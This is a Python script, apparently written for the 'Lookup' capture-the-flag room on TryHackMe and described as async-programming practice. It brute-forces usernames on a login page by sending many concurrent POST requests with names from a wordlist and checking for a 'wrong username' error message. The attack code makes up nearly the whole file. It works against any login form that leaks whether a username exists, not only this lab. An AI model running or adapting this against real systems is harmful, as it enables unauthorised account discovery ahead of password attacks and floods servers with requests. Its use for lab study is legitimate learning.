#!/usr/bin/python3

# Script for enumerating usernames from the login page of the "Lookup" room at TryHackMe.
# Built as a way to study async programming implementations with Python. As such, it may not be the most elegant solution to achieve the expected results.
# I encountered difficulties when attempting something similar during the "Capture" challenge, which led me to revisit this concept.
# This time, it worked well. I believe the main difference is that, unlike the "Capture" challenge where we needed to solve a CAPTCHA on subsequent requests,
# this challenge only requires sending requests to the API endpoint. Therefore, there is no significant drawback to sending a large number of requests at once,
# aside from the potential impact on server resources, which should be preserved.

import aiohttp  
import asyncio
import argparse
from termcolor import colored,cprint

parser = argparse.ArgumentParser(
    description='''Asynchronous login enumerator for LOOKUP TryHackMe challenge - Made for study purposes
    author: github.com/carlossb1''',
    epilog='Example: ./ghost.py -u http://target.com/login -l <wordlist>'
)
parser.add_argument('-u', '--url', required=True, help='Target login endpoit URL (for this challenge: http://<lookup.thm>/login.php')
parser.add_argument('-l', '--login', required=True, help='Username wordlist')
args = parser.parse_args()


headers = { 
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
    'Content-Type': 'application/x-www-form-urlencoded',
}

data = {
    'username': 'gambeta',
    'password': 'gambeta'
}

def banner():
    print("""

             ('-. .-.               .-')    .-') _   
            ( OO )  /              ( OO ). (  OO) )  
  ,----.    ,--. ,--. .-'),-----. (_)---\_)/     '._ 
 '  .-./-') |  | |  |( OO'  .-.  '/    _ | |'--...__)
 |  |_( O- )|   .|  |/   |  | |  |\  :` `. '--.  .--'
 |  | .--, \|       |\_) |  |\|  | '..`''.)   |  |   
(|  | '. (_/|  .-.  |  \ |  | |  |.-._)   \   |  |   
 |  '--'  | |  | |  |   `'  '-'  '\       /   |  |   
  `------'  `--' `--'     `-----'  `-----'    `--'   

""")

    print("TryHackMe lookup room")
    print("Username enumerator -  author: github.com/carlossb1")
    cprint("[!] This tool is not intended for use outside of this scope \n",'red')


async def validate_username(response_text):
    if 'wrong username' in response_text.lower():
        return False
    return True

async def send_request(session, username):
    data['username'] = username
    async with session.post('http://lookup.thm/login.php', data=data, headers=headers) as response:
        response_text = await response.text()
        if await validate_username(response_text):
            cprint(f'[+] username found: {username}', 'green')

async def main():
    
    try:
        with open(args.login, 'r',encoding='ISO-8859-1' ) as wordlist_file: #Changed encoding from UTF-8 to ISO to work with rockyou.txt
            usernames = [username.strip() for username in wordlist_file.readlines()]

        cprint(f'[!] Wordlist loaded successfully: {len(usernames)} usernames detected','yellow')
        cprint(f'[!] Enumerating target {args.url} with provided usernames ...','yellow')
    except Exception as e:
        print(f'[!] An error ocurred while loading wordlist: {e}','red')

    async with aiohttp.ClientSession() as session:
        tasks = []
        for username in usernames:
            task = asyncio.create_task(send_request(session, username))
            tasks.append(task)
        
        await asyncio.gather(*tasks)

if __name__ == '__main__':
    banner()
    asyncio.run(main())

